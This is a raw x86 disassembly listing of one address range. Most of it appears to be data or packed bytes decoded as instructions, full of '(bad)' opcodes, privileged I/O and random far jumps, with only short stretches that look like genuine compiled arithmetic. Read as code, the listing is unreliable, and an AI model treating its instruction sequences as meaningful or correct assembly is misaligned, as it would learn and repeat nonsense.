  41044c:	inc    ebp
  41044d:	test   al,0x16
  41044f:	into   
  410450:	mov    bl,0xf
  410452:	pop    eax
  410453:	mov    ss,ebp
  410455:	inc    ebp
  410456:	xchg   edx,ebx
  410458:	ficomp WORD PTR [edi+0x36]
  41045b:	fiadd  DWORD PTR [edi]
  41045d:	dec    edi
  41045e:	sbb    edi,DWORD PTR [esi-0x64fcf970]
  410464:	pop    ebp
  410465:	gs (bad) 
  410467:	in     eax,dx
  410468:	jmp    DWORD PTR [esi-0x70]
  41046b:	pop    ss
  41046c:	push   ss
  41046d:	int3   
  41046e:	or     DWORD PTR [eax-0x45],0x1b
  410472:	xor    esi,DWORD PTR [ebx]
  410474:	mov    bl,BYTE PTR [ebp-0x3b]
  410477:	add    ebx,edi
  410479:	xor    ebx,DWORD PTR [esi]
  41047b:	pop    esp
  41047c:	shr    DWORD PTR [ebx+0x5e],cl
  41047f:	sahf   
  410480:	dec    esi
  410481:	ins    BYTE PTR es:[edi],dx
  410482:	add    eax,0xc7687a2
  410487:	imul   eax,DWORD PTR [ecx+0x6d682b90],0xc8c8cbe7
  410491:	sub    eax,esp
  410493:	cmp    DWORD PTR [esi],eax
  410495:	in     al,0x59
  410497:	inc    esp
  410498:	or     al,0x80
  41049a:	enter  0x238d,0xcb
  41049e:	mov    esi,0x8ee7076a
  4104a3:	xchg   esi,eax
  4104a4:	call   0x4537eb8c
  4104a9:	int    0x1c
  4104ab:	hlt    
  4104ac:	mov    cl,BYTE PTR [ebp+0x47]
  4104af:	xchg   esp,eax
  4104b0:	jmp    DWORD PTR [edi+0x55857ce1]
  4104b6:	push   es
  4104b7:	jge    0x41047b
  4104b9:	cmp    eax,0xf897e4d3
  4104be:	pop    eax
  4104bf:	mov    edx,0x719b448c
  4104c4:	add    eax,0x757d0b66
  4104c9:	xchg   ebx,eax
  4104ca:	daa    
  4104cb:	out    0xb0,eax
  4104cd:	mov    ebp,0x52d50c09
  4104d2:	cld    
  4104d3:	bound  ecx,QWORD PTR [ecx]
  4104d5:	les    ebx,FWORD PTR [edi]
  4104d7:	add    ebp,0x36
  4104da:	sub    BYTE PTR [ecx-0x32],ch
  4104dd:	mov    ss,eax
  4104df:	mov    al,0xbe
  4104e1:	(bad)  
  4104e3:	ss push ecx
  4104e5:	ja     0x41046e
  4104e7:	xlat   BYTE PTR ds:[ebx]
  4104e8:	fist   WORD PTR [ebx-0x15]
  4104eb:	cwde   
  4104ec:	mov    WORD PTR [edi],es
  4104ee:	jp     0x41056e
  4104f0:	stos   DWORD PTR es:[edi],eax
  4104f1:	aam    0x95
  4104f3:	out    dx,al
  4104f4:	repnz out 0x5e,eax
  4104f7:	adc    DWORD PTR [ebp+0x22ef0c6b],edi
  4104fd:	pop    edi
  4104fe:	fcmovu st,st(7)
  410500:	mov    ebp,0x5f880df7
  410505:	and    DWORD PTR [eax],edi
  410507:	iret   
  410508:	xchg   ecx,eax
  410509:	mov    ah,0x68
  41050b:	loop   0x410539
  41050d:	jns    0x410538
  41050f:	test   eax,0x50f80366
  410514:	mov    ebx,0x23f0a166
  410519:	pop    esp
  41051a:	lahf   
  41051b:	jecxz  0x41050f
  41051d:	ret    
  41051e:	int3   
  41051f:	dec    esi
  410520:	xchg   esp,eax
  410521:	mov    ds:0x7b93fbe8,eax
  410526:	jbe    0x410580
  410528:	aaa    
  410529:	pop    ebp
  41052a:	gs clc 
  41052c:	pop    ebp
  41052d:	lds    eax,FWORD PTR [esi+eiz*4-0x55]
  410531:	jmp    0x1f7834d7
  410536:	fsubr  QWORD PTR [ebp-0x586e9f92]
  41053c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41053d:	push   edi
  41053e:	(bad)  
  41053f:	aaa    
  410540:	int    0xa8
  410542:	call   0xc77:0x23e74b4b
  410549:	popa   
  41054a:	imul   eax,DWORD PTR [ebx+0x3c],0xffffff9e
  41054e:	push   cs
  41054f:	mov    ds:0xc361ebd7,eax
  410554:	shl    BYTE PTR [ebx+0x3e],1
  410557:	iret   
  410558:	pop    esp
  410559:	adc    ch,BYTE PTR [esi]
  41055b:	jp     0x41055f
  41055d:	jne    0x410552
  41055f:	in     al,dx
  410560:	inc    ebp
  410561:	lds    ebp,FWORD PTR [ecx-0x34]
  410564:	sbb    ecx,DWORD PTR [ecx]
  410566:	mov    ah,0x72
  410568:	pop    edi
  410569:	movups XMMWORD PTR [ebp-0x65524351],xmm7
  410570:	(bad)  
  410571:	push   0xffffff95
  410573:	pop    esp
  410574:	push   ebx
  410575:	pop    edx
  410576:	add    ecx,0xffffffa5
  410579:	fidivr DWORD PTR [edi]
  41057b:	mov    bl,0xb0
  41057d:	add    BYTE PTR [ebx],bh
  41057f:	sub    al,0x90
  410581:	aas    
  410582:	outs   dx,BYTE PTR ds:[esi]
  410583:	add    bh,BYTE PTR [ebx+0x15b0ef36]
  410589:	mov    eax,0xfc312e26
  41058e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058f:	mov    es,WORD PTR [esi+ebp*1+0x11b1353]
  410596:	sbb    ch,BYTE PTR [edi+0x20608003]
  41059c:	pop    ecx
  41059d:	adc    edx,ecx
  41059f:	lods   al,BYTE PTR ds:[esi]
  4105a0:	fdivr  DWORD PTR [esi+0x321762d9]
  4105a6:	fs das 
  4105a8:	(bad)  
  4105a9:	push   0xa94fdc0e
  4105ae:	ins    DWORD PTR es:[edi],dx
  4105af:	mov    bh,BYTE PTR [esi+0x2232c5bc]
  4105b5:	ret    
  4105b6:	lods   al,BYTE PTR ds:[esi]
  4105b7:	rcr    DWORD PTR [edx],1
  4105b9:	repnz lods eax,DWORD PTR ds:[esi]
  4105bb:	and    ebp,edi
  4105bd:	or     BYTE PTR cs:[esp+edi*8-0x79],dh
  4105c2:	je     0x4105c4
  4105c4:	mov    bh,BYTE PTR [edx+0x590392b2]
  4105ca:	call   0x4a4e:0x43e3623d
  4105d1:	(bad)  [edi+0x17162bc8]
  4105d7:	sbb    DWORD PTR [ecx+0x29],eax
  4105da:	cwde   
  4105db:	sti    
  4105dc:	in     al,0x2f
  4105de:	clc    
  4105df:	adc    al,0x55
  4105e1:	mov    eax,ds:0x3b6d8d3e
  4105e6:	in     eax,0x82
  4105e8:	cmc    
  4105e9:	sar    BYTE PTR [edx],1
  4105eb:	jb     0x41059a
  4105ed:	rdmsr  
  4105ef:	xor    eax,DWORD PTR [ecx]
  4105f1:	loope  0x410650
  4105f3:	lahf   
  4105f4:	pop    es
  4105f5:	jecxz  0x41064c
  4105f7:	lods   eax,DWORD PTR ds:[esi]
  4105f8:	nop
  4105f9:	outs   dx,BYTE PTR ds:[esi]
  4105fa:	and    esi,DWORD PTR [esi-0x4f]
  4105fd:	add    ch,BYTE PTR [edi+0x3c2900f8]
  410603:	lods   eax,DWORD PTR ds:[esi]
  410604:	adc    DWORD PTR [edi],edi
  410606:	cld    
  410607:	jmp    0xf265:0xa02b4f3f
  41060e:	imul   edi,DWORD PTR gs:[eax-0x2ba27425],0x30c4d8b
  410619:	xor    DWORD PTR [ecx+0x79b577f2],eax
  41061f:	retf   
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x4222a7
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fisttp QWORD PTR [ebp+0x66]
  410673:	ret    
  410674:	iret   
  410675:	out    dx,eax
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	aad    0x5a
  41067f:	rol    bl,1
  410681:	mov    ecx,0xb17f252c
  410686:	(bad)  
  410688:	dec    ecx
  410689:	adc    eax,0x20bd684f
  41068e:	hlt    
  41068f:	mov    esp,0xd1843811
  410694:	jo     0x4106a6
  410696:	and    ebp,DWORD PTR [eax-0x581e6063]
  41069c:	xor    DWORD PTR [edi],0xd21eb1d0
  4106a2:	sbb    DWORD PTR [edx-0x4b],ecx
  4106a5:	mov    al,0x37
  4106a7:	cmc    
  4106a8:	and    DWORD PTR ds:0x3b7a7ab8,ebp
  4106ae:	mov    eax,ds:0x6a0c74b3
  4106b3:	je     0x4106c8
  4106b5:	cdq    
  4106b6:	mov    al,cl
  4106b8:	mov    esp,DWORD PTR [ecx-0x71]
  4106bb:	mov    eax,0xe640c97c
  4106c0:	mov    bh,0x8
  4106c2:	and    BYTE PTR [eax],dh
  4106c4:	popa   
  4106c5:	aam    0x19
  4106c7:	(bad)  
  4106c8:	lods   eax,DWORD PTR ds:[esi]
  4106c9:	and    DWORD PTR [eax+edx*8-0x7344b942],0x7e423eab
  4106d4:	test   al,0x40
  4106d6:	in     eax,0xb8
  4106d8:	in     eax,dx
  4106d9:	mov    ebx,DWORD PTR ds:0x68060e53
  4106df:	stc    
  4106e0:	inc    esp
  4106e1:	je     0x4106bc
  4106e3:	fs lock icebp 
  4106e6:	mov    DWORD PTR [ebp-0x4a82c643],edx
  4106ec:	and    ecx,DWORD PTR [eax]
  4106ee:	adc    DWORD PTR [edi-0x3c35a416],0x11
  4106f5:	sbb    eax,0x93e654cb
  4106fa:	jmp    0xb945:0x31551ec6
  410701:	sub    al,0xa5
  410703:	aaa    
  410704:	outs   dx,BYTE PTR ds:[esi]
  410705:	jbe    0x4106d8
  410707:	dec    esp
  410708:	jecxz  0x410721
  41070a:	(bad)  [edi]
  41070c:	fidiv  WORD PTR [esi+0x1426884b]
  410712:	stc    
  410713:	mov    es,WORD PTR [esi]
  410715:	and    BYTE PTR [ebp+0x30],dh
  410718:	add    eax,0x22dbe84c
  41071d:	ja     0x41077a
  41071f:	dec    ebp
  410720:	dec    ecx
  410721:	cmp    bl,ch
  410723:	ss adc al,0xc4
  410726:	retf   
  410727:	fwait
  410728:	mov    dh,ah
  41072a:	xchg   DWORD PTR [ecx+0x7b],ebp
  41072d:	mov    ebx,0x16cc6885
  410732:	sti    
  410733:	mov    dl,0x63
  410735:	pushf  
  410736:	inc    ebp
  410737:	sbb    al,0x5b
  410739:	repz das 
  41073b:	sub    eax,0xedacc27e
  410740:	sub    al,0x60
  410742:	call   0xe239:0x5894431
  410749:	mov    ch,0x65
  41074b:	add    al,0xd1
  41074d:	or     dh,BYTE PTR [edi]
  41074f:	(bad)  
  410750:	mov    DWORD PTR [edi-0x60],ecx
  410753:	jmp    0x4107d4
  410755:	(bad)  
  410756:	jmp    0x4107a0
  410758:	mov    bh,0x9c
  41075a:	pop    ebp
  41075b:	sub    bl,BYTE PTR [esi+0x5a]
  41075e:	lods   al,BYTE PTR ds:[esi]
  41075f:	pop    ds
  410760:	clc    
  410761:	dec    ebx
  410762:	add    eax,0x4b2962b2
  410767:	scas   al,BYTE PTR es:[edi]
  410768:	adc    BYTE PTR [edi+0x3bddd3fb],0xfe
  41076f:	pop    ds
  410770:	out    0xb0,al
  410772:	int3   
  410773:	dec    BYTE PTR [ebp-0x5b]
  410776:	sbb    eax,esp
  410778:	sbb    esi,edx
  41077a:	mov    ebx,0x6629b37d
  41077f:	push   es
  410780:	ins    DWORD PTR es:[edi],dx
  410781:	outs   dx,DWORD PTR ds:[esi]
  410782:	test   DWORD PTR [ecx],0xe9b0eb7a
  410788:	aaa    
  410789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41078a:	pusha  
  41078b:	mov    cs,WORD PTR [ebx+0x1]
  41078e:	mov    eax,0xcaeaac04
  410793:	mov    ds:0x65fccafc,al
  410798:	inc    edx
  410799:	mov    dl,BYTE PTR [eax+0x51617407]
  41079f:	adc    edi,DWORD PTR [ecx-0x19b53f7f]
  4107a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a6:	shr    ecx,1
  4107a8:	les    ebx,FWORD PTR [ecx]
  4107aa:	mov    ss,WORD PTR [eax-0x33bacf13]
  4107b0:	in     al,dx
  4107b1:	popf   
  4107b2:	and    al,0x1b
  4107b4:	jecxz  0x4107e2
  4107b6:	adc    eax,0x56a87ccb
  4107bb:	lds    ebp,FWORD PTR [esi-0x71]
  4107be:	xchg   ebp,eax
  4107bf:	dec    ebx
  4107c0:	jmp    0xf3b2:0x12875364
  4107c7:	rol    ah,1
  4107c9:	and    ebp,0x35
  4107cc:	mov    ah,0x9f
  4107ce:	sti    
  4107cf:	mov    al,0x91
  4107d1:	dec    ebx
  4107d2:	sti    
  4107d3:	or     edx,DWORD PTR [eax]
  4107d5:	icebp  
  4107d6:	xchg   edx,eax
  4107d7:	leave  
  4107d8:	pop    edx
  4107d9:	xlat   BYTE PTR ds:[ebx]
  4107da:	pmovmskb ebp,mm5
  4107dd:	int3   
  4107de:	push   ebp
  4107df:	inc    ebx
  4107e0:	(bad)  
  4107e1:	cvttss2si esp,DWORD PTR [eax+0x6f]
  4107e6:	jle    0x4107c1
  4107e8:	mov    ah,0x5d
  4107ea:	ret    0x2265
  4107ed:	out    dx,al
  4107ee:	xor    BYTE PTR [ecx],0x90
  4107f1:	add    ebp,DWORD PTR [edx-0x25]
  4107f4:	mov    cl,0x30
  4107f6:	mov    ds:0x964d98d2,eax
  4107fb:	and    edi,DWORD PTR [ebx]
  4107fd:	in     al,dx
  4107fe:	pop    ss
  4107ff:	and    eax,edx
  410801:	push   ss
  410802:	ficom  WORD PTR ss:[bx+si]
  410806:	xor    al,0x62
  410808:	dec    esp
  410809:	(bad)  [ebx+0xdb15aec]
  41080f:	adc    edi,eax
  410811:	pop    eax
  410812:	mov    BYTE PTR [ebp+0xecc5b88],dl
  410818:	outs   dx,BYTE PTR ds:[esi]
  410819:	mov    dh,0xe6
  41081b:	cmc    
  41081c:	aam    0x35
  41081e:	mov    eax,ds
  410820:	jle    0x41089f
  410822:	inc    ebp
  410823:	ins    DWORD PTR es:[edi],dx
  410824:	jo     0x410875
  410826:	jbe    0x410873
  410828:	push   0x3d
  41082a:	mov    WORD PTR [ecx-0x58],es
  41082d:	xor    BYTE PTR [esi+0x2c007dc4],ah
  410833:	popf   
  410834:	cmp    BYTE PTR [ecx],dl
  410836:	and    al,0x8c
  410838:	mov    eax,0x871760e9
  41083d:	daa    
  41083e:	pop    ecx
  41083f:	repz js 0x4107de
  410842:	fcomp  DWORD PTR [esi+0x17]
  410845:	das    
  410846:	jae    0x41080b
  410848:	pusha  
  410849:	push   eax
  41084a:	in     al,dx
  41084b:	idiv   BYTE PTR [edx-0xe755561]
  410851:	or     al,0x8
  410853:	pop    edx
  410854:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410856:	mov    al,ds:0x298b9c2
  41085b:	jnp    0x4107f0
  41085d:	adc    al,ah
  41085f:	fdiv   st(4),st
  410861:	mov    edi,0xd24ffd8f
  410866:	gs (bad) 
  410868:	(bad)  
  410869:	and    ebx,DWORD PTR ds:0x6fa381e7
  41086f:	out    0x87,eax
  410871:	mov    eax,ds:0x57bf999
  410876:	rol    DWORD PTR ds:0x6d3114f5,cl
  41087c:	lods   al,BYTE PTR ds:[esi]
  41087d:	fst    QWORD PTR [edx-0x5e]
  410880:	retf   0xfa94
  410883:	add    dl,bh
  410885:	bound  esi,QWORD PTR [eax-0x18]
  410888:	push   ebx
  410889:	sub    eax,0xe6952592
  41088e:	fwait
  41088f:	sbb    eax,0xc75b6d40
  410894:	and    esp,ecx
  410896:	adc    cl,BYTE PTR [edx-0x592175cf]
  41089c:	popa   
  41089d:	mov    al,ds:0x7eb9a3c4
  4108a2:	int3   
  4108a3:	push   esp
  4108a4:	or     DWORD PTR [ecx-0x4a336809],0xdae2680b
  4108ae:	test   cl,dl
  4108b0:	call   0xcb7a:0x57092725
  4108b7:	dec    esi
  4108b8:	popf   
  4108b9:	mov    dh,0xc1
  4108bb:	push   esp
  4108bc:	push   edx
  4108bd:	dec    esi
  4108be:	(bad)  
  4108bf:	mov    edi,0x9f33356b
  4108c4:	dec    edi
  4108c5:	cmp    ebp,DWORD PTR [ecx-0x27]
  4108c8:	sbb    edi,ebx
  4108ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108cb:	mov    ss,WORD PTR [edx]
  4108cd:	cmp    al,0x5a
  4108cf:	mov    ebx,0xca640f9b
  4108d4:	push   esp
  4108d5:	mov    bh,0x58
  4108d7:	xchg   esi,eax
  4108d8:	ds pop ds
  4108da:	outs   dx,DWORD PTR ds:[esi]
  4108db:	imul   eax,DWORD PTR [esi-0x3b],0x6f
  4108df:	ret    0x135
  4108e2:	jb     0x4108d7
  4108e4:	fbld   TBYTE PTR [ebx-0x45b4c5a7]
  4108ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108eb:	stos   BYTE PTR es:[edi],al
  4108ec:	pop    es
  4108ed:	push   ss
  4108ee:	addr16 jne 0x410878
  4108f1:	jns    0x4108a9
  4108f3:	sbb    eax,0x41590a68
  4108f8:	xor    esp,DWORD PTR [esi]
  4108fa:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4108fc:	sbb    dl,BYTE PTR [edi+0x76]
  4108ff:	xlat   BYTE PTR ds:[ebx]
  410900:	in     eax,0xe1
  410902:	sbb    al,0xe2
  410904:	int3   
  410905:	mov    DWORD PTR [eax+0x60],esp
  410908:	pop    ebx
  410909:	stos   DWORD PTR es:[edi],eax
  41090a:	and    eax,0xf4a70e25
  41090f:	xor    ch,BYTE PTR [esi+eax*8]
  410912:	xor    al,0xf
  410914:	jo     0x4108ce
  410916:	xchg   ecx,eax
  410917:	mov    ebp,0x8b7e1147
  41091c:	data16 arpl WORD PTR [esi-0x69c57a49],sp
  410923:	ror    ch,1
  410925:	xor    dl,bl
  410927:	scas   eax,DWORD PTR es:[edi]
  410928:	pop    ss
  410929:	and    ebx,ebx
  41092b:	outs   dx,BYTE PTR ds:[esi]
  41092c:	mov    edi,0x2c8df3fc
  410931:	xor    ebp,esp
  410933:	and    DWORD PTR [esi-0x191bbd05],ebx
  410939:	sub    ah,BYTE PTR [esi]
  41093b:	dec    esi
  41093c:	in     al,dx
  41093d:	pusha  
  41093e:	test   al,0x65
  410940:	repnz daa 
  410942:	push   ds
  410943:	cld    
  410944:	lds    edi,FWORD PTR ds:0x9ded2f61
  41094a:	call   0xebe1:0xdcbb47aa
  410951:	sub    ebp,DWORD PTR [edi+edi*8]
  410954:	pop    ss
  410955:	pop    ebx
  410956:	push   ecx
  410957:	xor    BYTE PTR [edx-0x2e],bh
  41095a:	inc    esp
  41095b:	xchg   ecx,eax
  41095c:	xchg   esi,eax
  41095d:	push   edi
  41095e:	lods   eax,DWORD PTR ds:[esi]
  41095f:	rcl    WORD PTR [esi-0x1bf0d6fa],0xff
  410967:	into   
  410968:	jae    0x410953
  41096a:	leave  
  41096b:	fwait
  41096c:	inc    edi
  41096d:	add    al,0xca
  41096f:	popf   
  410970:	out    0xa,eax
  410972:	mov    ebp,0x5abc2014
  410977:	in     eax,dx
  410978:	ds xchg ah,cl
  41097b:	stc    
  41097c:	xchg   edi,eax
  41097d:	inc    ebx
  41097e:	xchg   ebp,eax
  41097f:	lods   eax,DWORD PTR ds:[esi]
  410980:	ins    BYTE PTR es:[edi],dx
  410981:	mov    fs,WORD PTR [ecx+0x2d6e1584]
  410987:	lods   eax,DWORD PTR ds:[esi]
  410988:	or     ecx,edx
  41098a:	sbb    ah,BYTE PTR [esi+0x2abecf4a]
  410990:	clc    
  410991:	mov    esi,0x411c247
  410996:	sbb    bl,bl
  410998:	(bad)  
  410999:	adc    ch,al
  41099b:	cmp    eax,0xfcfd7d8a
  4109a0:	loop   0x4109c6
  4109a2:	fcmovbe st,st(5)
  4109a4:	ss jbe 0x41094c
  4109a7:	jne    0x410964
  4109a9:	loop   0x410984
  4109ab:	call   0xa26e22b6
  4109b0:	inc    eax
  4109b1:	sub    ah,bl
  4109b3:	test   al,0xfa
  4109b5:	(bad)
  4109b8:	in     al,dx
  4109b9:	xchg   edx,eax
  4109ba:	cdq    
  4109bb:	jg     0x410a27
  4109bd:	cld    
  4109be:	mov    dh,0x55
  4109c0:	push   ebp
  4109c1:	jns    0x410a3c
  4109c3:	and    dh,BYTE PTR [edx]
  4109c5:	xchg   ebx,eax
  4109c6:	fisubr WORD PTR [edi]
  4109c8:	aas    
  4109c9:	cmp    dl,BYTE PTR [esi-0x6fbf0d5e]
  4109cf:	jmp    0xa8e9c3d9
  4109d4:	mov    ch,ch
  4109d6:	sub    DWORD PTR [ecx],ebp
  4109d8:	and    edx,DWORD PTR [edx+0x44]
  4109db:	add    bh,bh
  4109dd:	aad    0xc3
  4109df:	sub    BYTE PTR [edi+0x40c8ee5b],dl
  4109e5:	ds pop ds
  4109e7:	sbb    edi,DWORD PTR [esi-0xf90ee20]
  4109ed:	inc    ebx
  4109ee:	pop    ebp
  4109ef:	rcr    DWORD PTR [ecx-0x3f12f7a7],cl
  4109f5:	das    
  4109f6:	test   bh,ah
  4109f8:	xchg   eax,ecx
  4109fa:	push   ebx
  4109fb:	mov    ebx,0x7b2c6a77
  410a00:	cs pusha 
  410a02:	dec    esp
  410a03:	mov    WORD PTR [eax+0x1e513458],ss
  410a09:	lea    edi,[edi+0x21088c81]
  410a0f:	lods   eax,DWORD PTR ds:[esi]
  410a10:	(bad)  
  410a11:	mov    WORD PTR [edi],fs
  410a13:	pop    esi
  410a14:	mov    esi,DWORD PTR [ebp-0x3c]
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0x80f68ca4
  410a4c:	iret   
  410a4d:	push   ss
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0xc1bd961d
  410a59:	jg     0x410a30
  410a5b:	sub    al,0xe4
  410a5d:	mov    ebx,0x6fba5430
  410a62:	imul   ecx,ecx,0xeeec9965
  410a68:	retf   0xf6ec
  410a6b:	jp     0x410ade
  410a6d:	xor    bl,BYTE PTR [ebx]
  410a6f:	adc    DWORD PTR [edi],edx
  410a71:	sbb    eax,0x184e6522
  410a76:	fdiv   DWORD PTR [ebx]
  410a78:	call   0x3e000e5a
  410a7d:	push   edx
  410a7e:	xchg   edx,eax
  410a7f:	(bad)  
  410a80:	nop
  410a81:	add    al,0xc6
  410a83:	push   ecx
  410a84:	mov    edx,0x3f8ccbdb
  410a89:	test   al,0xff
  410a8b:	jl     0x410a2d
  410a8d:	pop    esi
  410a8e:	jae    0x410aea
  410a90:	outs   dx,BYTE PTR ds:[esi]
  410a91:	ins    BYTE PTR es:[edi],dx
  410a92:	repz inc esi
  410a94:	mov    al,0xa3
  410a96:	sar    DWORD PTR [edx],cl
  410a98:	aaa    
  410a99:	add    eax,0xdafdcf0
  410a9e:	xchg   ebp,esp
  410aa0:	pop    es
  410aa1:	jle    0x410a2c
  410aa3:	or     dh,BYTE PTR [eax]
  410aa5:	into   
  410aa6:	in     al,0x2c
  410aa8:	in     eax,0xfa
  410aaa:	cmp    BYTE PTR [esi-0x50c2ddf],dh
  410ab0:	jno    0x410af5
  410ab2:	mov    BYTE PTR [esi+0x5ac05c95],cl
  410ab8:	and    DWORD PTR [ecx-0x30],0x87a3d12a
  410abf:	out    0xcd,eax
  410ac1:	adc    BYTE PTR [ecx],bl
  410ac3:	push   0x8
  410ac5:	out    dx,al
  410ac6:	dec    ecx
  410ac7:	xchg   edi,eax
  410ac8:	mov    eax,0x3e0f8771
  410acd:	xchg   ebx,eax
  410ace:	jmp    FWORD PTR [eax+0xe3421a4]
  410ad4:	sbb    ecx,DWORD PTR [edx+0x430fd3aa]
  410ada:	xchg   esi,eax
  410adb:	mov    edx,DWORD PTR [esp+edx*1]
  410ade:	xchg   esp,eax
  410adf:	or     ebx,DWORD PTR [esi+0x41]
  410ae2:	outs   dx,BYTE PTR gs:[esi]
  410ae4:	scas   al,BYTE PTR es:[edi]
  410ae5:	xchg   DWORD PTR cs:[ebx],edx
  410ae8:	and    ah,BYTE PTR [ebp-0x41]
  410aeb:	es pop es
  410aed:	pop    edx
  410aee:	jno    0x410ac2
  410af0:	xchg   ebp,eax
  410af1:	pop    es
  410af2:	push   es
  410af3:	adc    al,0xf3
  410af5:	das    
  410af6:	pop    ds
  410af7:	dec    edx
  410af8:	cwde   
  410af9:	in     eax,dx
  410afa:	imul   ecx,DWORD PTR [esi+edx*4+0x6e],0x31
  410aff:	mov    ebp,0x29926953
  410b04:	xor    ebp,esi
  410b06:	dec    edx
  410b07:	push   edx
  410b08:	dec    eax
  410b09:	mov    ebp,0x193dd5ae
  410b0e:	fwait
  410b0f:	aaa    
  410b10:	popa   
  410b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b12:	push   ebx
  410b13:	sar    BYTE PTR [edx+0x1d6b436c],1
  410b19:	div    DWORD PTR [edi]
  410b1b:	repnz icebp 
  410b1d:	fist   DWORD PTR ds:0x6b031a3f
  410b23:	outs   dx,BYTE PTR ds:[esi]
  410b24:	rcl    DWORD PTR [ebx-0x59],cl
  410b27:	xor    ebp,esi
  410b29:	pop    esi
  410b2a:	and    DWORD PTR [ebp+0x5211fede],0x8a9cc3cc
  410b34:	or     ebp,DWORD PTR [esi+0x2f]
  410b37:	inc    edi
  410b38:	shl    DWORD PTR [ebx],0x5d
  410b3b:	sti    
  410b3c:	or     eax,0x91258bcb
  410b41:	dec    edx
  410b42:	out    dx,al
  410b43:	mov    ebp,0xe45469a
  410b48:	sub    ch,dl
  410b4a:	add    al,0xf6
  410b4c:	leave  
  410b4d:	ds dec esi
  410b4f:	test   BYTE PTR [ebp-0x7c4acece],0xe9
  410b56:	lods   eax,DWORD PTR ds:[esi]
  410b57:	jl     0x410afd
  410b59:	pop    ebx
  410b5a:	and    bh,ch
  410b5c:	ja     0x410bcb
  410b5e:	sbb    DWORD PTR [esi+ebp*8-0x34074ae0],ebx
  410b65:	rcl    ah,0x87
  410b68:	neg    DWORD PTR [esi-0x7a33d5f5]
  410b6e:	lea    ebp,[esi+0x4f]
  410b71:	enter  0x659,0x50
  410b75:	or     al,ch
  410b77:	(bad)  
  410b78:	jecxz  0x410bf8
  410b7a:	imul   eax,DWORD PTR [ebx],0xffffff84
  410b7d:	adc    al,0xb7
  410b7f:	stc    
  410b80:	ficomp DWORD PTR [ecx+ecx*4+0x8]
  410b84:	xlat   BYTE PTR ds:[ebx]
  410b85:	std    
  410b86:	mov    edi,0xf831de8c
  410b8b:	sar    DWORD PTR [esi+ecx*4+0x1d],cl
  410b8f:	sub    DWORD PTR [eax-0x1f],ecx
  410b92:	test   DWORD PTR [ebp+0x2],esi
  410b95:	mov    ebx,0x486aeab6
  410b9a:	adc    bl,cl
  410b9c:	adc    edi,edx
  410b9e:	aam    0x79
  410ba0:	rol    ch,1
  410ba2:	adc    DWORD PTR [ecx-0x4289c19],edi
  410ba8:	pop    esi
  410ba9:	adc    al,0xb6
  410bab:	or     DWORD PTR [ebp+0x48e6c587],ebp
  410bb1:	outs   dx,DWORD PTR ds:[esi]
  410bb2:	mov    esp,0x6788eb9a
  410bb7:	stos   DWORD PTR es:[edi],eax
  410bb8:	in     al,dx
  410bb9:	sbb    BYTE PTR [esi],0x55
  410bbc:	mov    dl,0x54
  410bbe:	xchg   ebx,eax
  410bbf:	repz mov ds:0x8d887535,al
  410bc5:	(bad)  
  410bc6:	fcomp  DWORD PTR [ecx-0x4c33b51c]
  410bcc:	adc    al,BYTE PTR [edx+0x22447684]
  410bd2:	push   ebx
  410bd3:	les    esp,FWORD PTR [edi+0x4e]
  410bd6:	cmova  esp,DWORD PTR [edi+0x32]
  410bda:	(bad)  
  410bdb:	and    esi,edi
  410bdd:	clc    
  410bde:	xchg   ebp,eax
  410bdf:	sub    BYTE PTR [esi+esi*4+0xb],cl
  410be3:	rcl    BYTE PTR [edi],1
  410be5:	xor    al,0x3f
  410be7:	xor    esi,DWORD PTR [edx]
  410be9:	aad    0xbc
  410beb:	add    BYTE PTR [ebx],dl
  410bed:	and    BYTE PTR [ecx-0x5ef15936],cl
  410bf3:	(bad)
  410bf8:	inc    ebp
  410bf9:	call   0x2d71ea50
  410bfe:	pop    ecx
  410bff:	cld    
  410c00:	mov    ecx,0x2c31e52f
  410c05:	cmp    bh,ch
  410c07:	jl     0x410c3f
  410c09:	add    BYTE PTR [edx],bl
  410c0b:	adc    ah,BYTE PTR [edx+0x31a61b72]
  410c11:	cmp    esp,eax
  410c13:	sbb    eax,0xcec5ab02
  410c18:	mov    esi,DWORD PTR [edi]
  410c1a:	mov    esp,eax
